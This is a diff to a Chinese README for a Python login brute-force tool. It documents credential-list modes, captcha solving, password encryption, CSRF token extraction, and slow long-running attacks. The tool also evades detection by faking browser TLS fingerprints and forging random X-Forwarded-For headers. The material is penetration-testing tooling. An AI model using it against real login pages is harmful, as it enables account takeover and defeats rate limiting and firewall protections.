@@ -7,286 +7,283 @@
 3. 想要每次请求时携带随机的XFF头
 4. 请求体中需要携带CSRF Token
 5. 图片验证码识别
-6. 想要把爆破工具放在服务器上以极慢的请求速度长期运行
+6. 想要把工具放在服务器上以极慢的请求速度长期运行
 7. ...
 
 为了解决以上问题，于是有了这个项目。
 
 # 特点
 
-1. 使用 Python + Requests + PyCryptodome + selenium 的组合进行开发
-2. 提前预置了常见的加密/哈希算法，如：RSA、AES、MD5，登录时直接调用即可实现用户名密码加密功能
-3. 支持使用selenium加载JS文件并调用其中的函数（selenium仅负责加载并调用JS代码，不负责发起登录）
-4. 支持验证码识别，并将识别失败的请求单独记录到文件中，方便重新尝试登录
-5. 支持多线程并发登录操作，以及设置每次发起请求前延迟固定时间
+1. 使用 Python + curl_cffi + PyCryptodome 的组合进行开发，使用 curl_cffi 模拟真实浏览器TLS指纹，避免被WAF识别
+2. 预置了常见的加密/哈希算法（DES、AES、RSA、MD5、HMAC、Base64），登录时直接调用即可实现用户名密码加密
+3. 支持使用 QuickJS 执行JS脚本，无需依赖浏览器环境，轻量高效
+4. 支持 ddddocr 验证码识别，可识别常见图片验证码及内联Base64图片
+5. 支持多线程并发操作，以及设置每次发起请求前延迟固定时间
+6. 支持两种爆破模式：`clusterbomb`（乘积模式）和 `pitchfork`（草叉模式），与 Burpsuite / Yakit 对齐
+7. 每次请求自动携带随机 X-Forwarded-For 等伪造IP头
+8. 内置重试机制，遇到502等服务器错误可自动重试
+9. 连续异常超过10次自动退出，避免无意义请求
 
-# 使用教程（同时也是代码解析）
+# 项目结构
+
+```
+main.py              # 主程序入口，包含全局配置、爆破函数和线程池调度
+requirements.txt     # Python依赖库
+utils/
+    crypto.py        # 加密/哈希工具（DES、AES、RSA、MD5、HMAC、Base64）
+    captchadet.py    # 验证码识别模块（基于ddddocr）
+    execjs.py        # JS脚本执行模块（基于QuickJS）
+test/
+    signature.js     # JS脚本示例文件
+```
+
+# 使用教程
 
 ## 一、安装Python所需依赖库
 
 ```
-# 必须
-python -m pip install requests requests-ntlm pycryptodome lxml
-
-# 可选，selenium用于执行JS脚本
-python -m pip install selenium
-
-# 可选，如果调用了验证码识别模块，则需要安装以下依赖
-python -m pip install pillow onnxruntime
-
-# 可选，onnxruntime模块运行可能会需要安装以下VC运行时
-https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist
+pip install -r requirements.txt
 ```
+
+requirements.txt 中包含以下依赖：
+
+```
+curl_cffi       # HTTP请求库，支持浏览器TLS指纹模拟
+ddddocr         # 验证码识别（可选功能，不使用验证码识别可不安装）
+lxml            # HTML解析，用于XPath提取CSRF Token等
+pycryptodome    # 加密算法库
+```
+
+> 可选：ddddocr 运行可能需要安装 VC 运行时：https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist
+
+> 可选：如果需要执行JS脚本，需手动下载 [QuickJS](https://github.com/quickjs-ng/quickjs) 并将路径添加到环境变量中
 
 ## 二、设置密码字典
 
-定位到如下代码位置，`USERNAME`、`PASSWORD` 这两个全局变量储存的就是用户名和密码的字典列表，可以在里面填入一些自定义的账号或密码，该列表后续还会通过读取文件进行扩充：
+定位到 `main.py` 中的 `configs` 全局配置字典，`account_list` 储存的是内置的用户名和密码列表，可以直接填入一些自定义的账号或密码：
 
 ```python
-USERNAME = ["admin"]   # USERNAME = USERNAME + USERNAME_FILE_PATH + USERPASS_FILE_PATH[0]
-PASSWORD = ["123456"]  # PASSWORD = PASSWORD + PASSWORD_FILE_PATH + USERPASS_FILE_PATH[1]
+"account_list": {
+    "username": [ "admin" ],
+    "password": [ "123456" ]
+},
 ```
 
-以下三个全局变量指定的是 `用户名字典文件路径`、`密码字典文件路径`、`用户名密码对字典文件路径（admin:123456）`，这三个全局变量可以被注释，如果变量被注释，则不会读取对应的字典文件
+`account_file` 指定用户名字典文件和密码字典文件的路径，留空则不读取对应的字典文件：
 
 ```python
-USERNAME_FILE_PATH = r"username.txt" # 代码被注释、空字符串或None就不读取
-PASSWORD_FILE_PATH = r"password.txt" # 代码被注释、空字符串或None就不读取
-USERPASS_FILE_PATH = r"userpass.txt" # 代码被注释、空字符串或None就不读取
+"account_file": {
+    "username": r"", # /path/to/username.txt
+    "password": r""  # /path/to/password.txt
+},
 ```
 
-> 脚本对以上三个全局变量进行以下操作：
-> `USERNAME_FILE_PATH` 字典文件中的内容，以行为单位，读取后加入 `USERNAME` 变量
-> `PASSWORD_FILE_PATH` 字典文件中的内容，以行为单位，读取后加入 `PASSWORD` 变量
-> `USERPASS_FILE_PATH` 字典文件中的内容，以行为单位，读取后使用 `:` 符号分割字符串，前半段加入 `USERNAME` 变量，后半段加入 `PASSWORD` 变量
+> 字典文件中的内容以行为单位读取，读取后追加到 `account_list` 中对应的列表
 
-## 三、设置其他的全局变量
+## 三、设置全局配置
 
-设置其他的全局变量，通过注释基本能了解含义
+`configs` 字典中的其他配置项：
 
 ```python
-# 只爆破一个账号
-ONLY_ONCE = False
+# 爆破模式
+#   pitchfork = 草叉模式（Yakit） / Pitchfork（Burpsuite）
+#   clusterbomb = 乘积模式（Yakit） / ClusterBomb（Burpsuite）
+"mode": "clusterbomb",
 
-# 线程并发数
-THREADS = 1
+# 超时时间，单位秒
+"timeout": 10,
 
-# 每个线程发起登录后暂停时长，单位秒
-DELAY = 1
+# 线程并发数，在涉及到验证码识别的时候不建议使用多线程，线程并发需要设置为1
+"threads": 10,
 
-# 是否使用代理，主要用于调试
-USE_PROXY = True
+# 每个线程发起请求后暂停时长，单位秒
+"delay": 1,
+
+# 密码爆破日志
+"logfile": {
+    "found": "found.txt",        # 正常的爆破日志
+    "exception": "exception.txt", # 发生异常时的日志
+},
+
+# 是否使用代理
+"use_proxy": False,
 
 # 设置代理
-PROXIES = {
-    "http": "http://127.0.0.1:8083",
-    "https": "http://127.0.0.1:8083"
+"proxies": {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
+},
+
+# 自定义headers
+"headers": {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
+    "Connection": "close",
+},
+
+# 自定义cookies
+"cookies": {
+    # "JSESSIONID": ""
 }
 ```
 
-## 四、编写加密算法
+**爆破模式说明：**
 
-爆破后台时经常会遇到密码经过加密或哈希后再提交的情况，脚本中内置了多种常见的加密算法，如果实战中发现网站所用的加密算法不在以下列表中，或输出格式不正确，也可以自行补充、调整：
++ `clusterbomb`（乘积模式）：对用户名列表和密码列表做笛卡尔积，尝试所有组合，总请求数 = 用户名数 × 密码数
++ `pitchfork`（草叉模式）：用户名和密码按位置一一对应，总请求数 = min(用户名数, 密码数)
 
-DES加密，输出Base64格式，密钥需要自行调整
+## 四、加密算法调用（可选）
 
-```python
-def DES_encrypt(message: str) -> str:
-    cipher = DES.new(key=b'12345678', iv=b'12345678', mode=DES.MODE_CBC)
-    message = pad(message.encode('utf-8'), DES.block_size, style='pkcs7')
-    encrypted = cipher.encrypt(message)
-    encrypted = base64.b64encode(encrypted) # BASE64
-    #encrypted = binascii.hexlify(encrypted) # HEX
-    return encrypted.decode('utf-8') #.upper()
-```
-
-AES加密，输出Base64格式，密钥需要自行调整
+爆破时经常会遇到密码经过加密或哈希后再提交的情况。加密工具已封装在 `utils/crypto.py` 中，在 `run` 函数中按需调用即可：
 
 ```python
-def AES_encrypt(message: str) -> str:
-    cipher = AES.new(key=b'1234567890ABCDEF', iv=b'1234567890ABCDEF', mode=AES.MODE_CBC)
-    message = pad(message.encode('utf-8'), AES.block_size, style='pkcs7')
-    encrypted = cipher.encrypt(message)
-    encrypted = base64.b64encode(encrypted) # BASE64
-    #encrypted = binascii.hexlify(encrypted) # HEX
-    return encrypted.decode('utf-8') #.upper()
+from utils import crypto
+
+password = crypto.DES_encrypt("123456")     # DES加密，输出Base64
+password = crypto.AES_encrypt("123456")     # AES加密，输出Base64
+password = crypto.RSA_encrypt("123456")     # RSA加密，输出Base64
+password = crypto.MD5_hash("123456")        # MD5哈希，输出HEX
+password = crypto.HMAC_hash("123456")       # HMAC-SHA256哈希，输出HEX
+password = crypto.Base64_encode("123456")   # Base64编码
 ```
 
-RSA加密，输出Base64格式，密钥需要自行调整
-
-```python
-def RSA_encrypt(message: str) -> str:
-    pubkey = """-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyyD6Zn7VNrR/YknPProx
-P9oEzkxeG+VCFLwQ+k2cAWuYWQKSnXSW/UX3sHLIyLXsorKQe19pQOIjssr46KN+
-PQbDVG7zaj6RZZlTC+q6/kXwRw0v9wXQ2dXBjNdCDNNwop/GxavvKhLJonKRgVFm
-2Y4cUxxcL/ZukvJ5aJAaHoRaf7/jq4vTDWARyroFh6pEN7TGg3acwH9YSpkOX5sV
-n7pT9qwFOZ+DdvIUOIvO3hIRA1PDQOSVJRawsffwqFCzxeZMmeakEr7Tn4NavkVL
-oXdRoE29N6JHoBBinjNd/yLCE352E2M/WJeYNhlugzVyFNcuyckqsIl5Hrm3qHvT
-YwIDAQAB
------END PUBLIC KEY-----"""
-    pubkey = RSA.importKey(pubkey)
-    cipher = PKCS1_v1_5.new(pubkey)
-    message = message.encode('utf-8')
-    encrypted = cipher.encrypt(message)
-    encrypted = base64.b64encode(encrypted) # BASE64
-    #encrypted = binascii.hexlify(encrypted) # HEX
-    return encrypted.decode('utf-8') #.upper()
-```
-
-MD5哈希，输出HEX格式
-
-```python
-def MD5_hash(message: str) -> str:
-    hash = MD5.new()
-    hash.update(message.encode('utf-8'))
-    return hash.hexdigest()
-```
+> 加密函数中的密钥/公钥均为示例，实际使用时需根据目标网站修改 `utils/crypto.py` 中对应的密钥
+> RSA加密同时支持 Base64 格式公钥和 PEM 格式公钥，详见 `utils/crypto.py` 中的注释
+> 每个加密函数默认输出 Base64 格式，如需 HEX 格式，可取消注释 `binascii.hexlify` 那一行
 
 ## 五、JS脚本调用（可选）
 
-如果遇到提交的某些数据需要调用网页中的某些JS函数才能获得，则可以使用以下代码来实现JS的载入和调用：
+如果遇到提交的某些数据需要调用网页中的JS函数才能获得，可以使用 QuickJS 来执行JS脚本。
+
+首先需要手动下载 [QuickJS](https://github.com/quickjs-ng/quickjs)，并将其路径添加到系统环境变量中。
+
+JS执行模块位于 `utils/execjs.py`，默认调用 `qjs.exe` 来执行JS代码：
 
 ```python
-from selenium.webdriver.chrome.options import Options
-from selenium import webdriver
+from utils import execjs
 
-# 以无头模式启动Chrome浏览器
-BROWSER_OPTIONS = Options()
-BROWSER_OPTIONS.add_argument('--headless')
-BROWSER_OPTIONS.add_argument('--disable-gpu')
-
-# 载入网页中的JS脚本，这里的URL需要调整为目标网站的JS链接
-BROWSER = webdriver.Chrome(options=BROWSER_OPTIONS)
-BROWSER.get('data:text/html;charset=utf-8,<script src="https://example.com/js/jsencrypt.min.js"></script>')
-
-# 载入自定义JS脚本（仅是载入，还没有运行），这里就以简单的RSA加密功能为例，此步骤创建了一个JSEncrypt对象，并设置了RSA公钥
-BROWSER.execute_script(r'''
-pk = "-----BEGIN PUBLIC KEY-----\n";
-pk += "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2hQp7K25U5kQqE/WFX7f\n";
-pk += "hq+YeaLCps8jiUZfIVmq8w2AtHMgdzsea7KCp1K98pcNg3bvdjBoxyfRB2uox0d8\n";
-pk += "NzE6QZRTHT3LS57n6BVq4z+nGpXw4kiyIZYhflZnKph8pmbI4pucQaOj+0yUIYrs\n";
-pk += "yRsHwAIpeGAxFhmgzGNYdxQ+UwUHk9tZqXdHfIIqd2/rbbbFLO6VnzQstRJTQrwa\n";
-pk += "78NyznlEkmeOXPKMuh/WgrkA3+6cMYH6mnmt3zPzU0YnZDXsSpGViyErRty7s3O5\n";
-pk += "X/u59C8ScMnvk52lVGYsAikAX8sL/rF6JNFke2A5CfSjtKKeGldU8LbWffF457xb\n";
-pk += "yQIDAQAB\n";
-pk += "-----END PUBLIC KEY-----";
-cipher = new JSEncrypt;
-cipher.setPublicKey(pk);
-''')
-
-# 调用无头浏览器中的JSEncrypt对象，对username、password变量进行RSA加密 （这里才是开始正式调用JS函数进行加密）
-username_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', username)
-password_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', password)
-
-# 别忘了在脚本退出前关闭浏览器，释放系统资源
-BROWSER.quit()
+# 需要先修改 utils/execjs.py 中的功能函数，自行定制所需功能
+signature = execjs.signature("123456")
+print(signature)
 ```
+
+> `utils/execjs.py` 中的 `signature` 函数仅是示例，需要根据实际场景自行编写函数
+> JS脚本文件（如 `test/signature.js`）需要根据目标网站的JS逻辑进行编写
 
 ## 六、验证码识别（可选）
 
-这里所使用的验证码识别模块是改版的[DdddOcr](https://github.com/sml2h3/ddddocr)，感谢作者提供的训练模型及使用代码
+验证码识别基于 [ddddocr](https://github.com/sml2h3/ddddocr)，支持常见的图片验证码识别：
 
 ```python
-import requests
-import captchadet
+from utils import captchadet
 
-# 引入验证码识别模型
-MODEL = captchadet.init_model()
+# 初始化识别模型
+ocr = captchadet.init()
 
-# 验证码识别
-url = "https://example.com"
-session = requests.Session()
-response = session.get(url + "/login/vcode")
-captcha = captchadet.identify(MODEL, response.content) # 这里 captcha 就是识别结果
+# 方式一：识别字节格式的图片验证码
+response = session.get("https://example.com/login/vcode")
+captcha = captchadet.identify_image(ocr, response.content)
+
+# 方式二：识别内联Base64图片（如 data:image/png;base64,iVBOR...）
+captcha = captchadet.identify_inline_image(ocr, response.text)
 ```
 
-## 七、开始编写爆破函数
+> 在涉及到验证码识别时不建议使用多线程，应将 `configs["threads"]` 设置为 1
 
-上面编写的代码都是预备环节，接下来开始编写真正负责发起登录操作的 `run` 函数：
+## 七、编写爆破函数
+
+上面的步骤都是可选的准备环节，核心要编写的是 `main.py` 中的 `run` 函数，它负责发起单次登录操作：
 
 ```python
-def run(username, password): # 爆破函数，返回 (no_exception, found_password)
+def run(username, password):
     ...
 ```
 
 > 该函数由 `futures.ThreadPoolExecutor` 线程池负责调度，每调用一次 `run` 函数，就发起一次登录操作
 
-> `run` 函数的参数 `username`、`password` 也由线程池负责自动填充
+> `run` 函数的参数 `username`、`password` 由线程池根据爆破模式自动填充
 
-> `run` 函数的返回值为两个布尔值 (no_exception, found_password)
-> + `no_exception` 指示了此次登录操作没有遭遇异常（如：服务器拒绝连接，返回的内容无法解析），如果一切正常，返回True，否则返回False
-> + `found_password` 指示了此次登录是否找到了正确密码，如果判断找到了密码，返回True，否则返回False
+代码中已提供了一个示例模板，以下是关键要点：
 
-这里给出一个简单的爆破例子，只要掌握requests模块的用法，相信你能很轻易的读懂以下代码，在这个例子中，判断登录密码是否找到，主要看服务器的响应中，是否包含 "Login failed" 或 "Unknown user" 字段：
+**1. 自动伪造IP头**
 
-> `username` 和 `password` 参数可以调用前面提到的加密算法进行加密，同时也可以结合上述的验证码识别、JS函数调用等操作，项目的代码中还提供更多可能会用到的代码，如：使用Xpath获取CSRF Token、使用NTLM认证等
+每次请求会自动生成随机IP并添加到 X-Forwarded-For、X-Real-IP 等请求头中，无需手动处理。
 
-> 代码支持设置自定义请求头和Cookies，只需要编辑、更新 `headers` 和 `cookies` 变量即可
+**2. 使用 curl_cffi 发起请求**
 
 ```python
+session = requests.Session(impersonate="firefox133")
 
-def run(username, password): # 爆破函数，返回 (no_exception, found_password)
-
-    time.sleep(DELAY) # 延迟一段时间再爆破
-
-    # 设置Headers
-    headers = requests.utils.default_headers()
-    headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
-        "Connection": "close",
-    })
-
-    # 设置Cookies
-    cookies = {
-        'SESSIONID': '',
-    }
-
-    try:
-        url = "https://example.com"
-        session = requests.Session()
-
-        data = {
-            "username": username,
-            "password": RSA_encrypt(password)
-        }
-        response = session.post(url + "/login.html",
-            data=data, headers=headers, cookies=cookies, timeout=10, 
-            allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
-
-        if "Login failed" in response.text:
-            return True, False
-
-        if "Unknown user" in response.text:
-            return True, False
-        
-        output = f"[++] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}"
-        log(FOUND_PATH, FOUND_LOCK, f"{output}\n")
-        print(output)
-        return True, True
-
-    except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
-        log(EXCEPTION_PATH, EXCEPTION_LOCK, f"{username}:{password}\n")
-        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}")
-        return False, False
-
-    except Exception as e:
-        log(EXCEPTION_PATH, EXCEPTION_LOCK, f"{username}:{password}\n")
-        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}, detail:")
-        print(traceback.format_exc())
-        return False, False
+data = {
+    "username": username,
+    "password": password
+}
+response = session.post(url + "/login.html",
+    json=data, cookies=cookies, headers=headers, proxies=proxies,
+    verify=False, allow_redirects=False, timeout=configs["timeout"])
 ```
 
-编写完 `run` 函数后，便可以使用 `python bftool.py` 进行调试运行
+> curl_cffi 的 `impersonate` 参数可模拟真实浏览器的TLS指纹，可选值如 `"firefox133"`、`"chrome131"` 等
+
+**3. 内置重试机制**
+
+`run` 函数内有一个 while 循环，可以针对特定条件（如服务器返回502、验证码识别错误等）自动进行重试，超过次数上限后抛出异常：
+
+```python
+error = {}
+error["502"] = 0
+while True:
+    # ... 发起请求 ...
+    if response.status_code == 502:
+        error["502"] += 1
+        if error["502"] > 5:
+            raise Exception("Server internal error")
+        continue
+    else:
+        break
+```
+
+**4. 判断登录结果**
+
+一般情况下可以知道登录失败会返回什么报文，而不知道登录成功会返回什么报文，因此建议在 `if` / `elif` 中编写失败的判断条件，用 `else` 来处理登录成功的情况：
+
+```python
+if "用户不存在" in response.text:    # 失败条件1
+    return
+elif "密码错误" in response.text:    # 失败条件2
+    return
+else:                                # 成功
+    info_message(f"[++] Found {username}:{password} ...")
+    return
+```
+
+> 常见的判断方式还有：`response.status_code == 401`、`len(response.content) == 100`、检查 302 跳转的 Location 等，根据实际场景调整即可
+
+**5. XPath提取CSRF Token**
+
+如果登录请求需要携带 CSRF Token，可以用 lxml 的 XPath 从页面中提取：
+
+```python
+from lxml import etree
+
+response = session.get("https://example.com/login")
+html = etree.HTML(response.text, etree.HTMLParser())
+csrftoken = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]
+```
+
+编写完 `run` 函数后，即可运行：
+
+```
+python main.py
+```
 
 ## 八、线程池调度
 
-+ 代码中 `# =================== [ 启动多线程爆破 ] ===================` 以下的部分都是负责线程池调度和负责日志输出的代码，建议保持默认即可
++ `main.py` 底部的线程池调度和日志输出代码，建议保持默认即可
 
-+ 线程池支持 `Ctrl+C` 异常捕捉，所以可以使用键盘中断程序运行
++ 线程池支持 `Ctrl+C` 键盘中断，可随时停止程序运行
 
-+ 本工具每隔10分钟就会以百分比的形式汇报一次进度，方便预估脚本运行时间
++ 工具每隔10分钟以百分比形式汇报一次进度，方便预估运行时间
 
-+ 每个线程运行期间如果遭遇异常，就会累加异常计数，如果下一个线程能正常完成请求，就会将异常计数归0，如果异常计数累计达到10的时候，程序就会退出，避免无意义的发起请求
++ 每个线程运行期间如果遭遇异常，会累加异常计数；如果下一个线程能正常完成请求，异常计数归零；连续异常累计超过10次时程序自动退出，避免无意义的请求
 
-+ 成功爆破的密码会记录在 `found.txt` 文件里，如果遭遇异常（如：网络连接中断、服务器拒绝连接），则登录异常的密码会记录在 `exception.txt` 中，方便重新再跑一遍
++ 成功找到的密码会记录在 `found.txt` 文件里；遭遇异常的密码会记录在 `exception.txt` 中，方便后续重新尝试
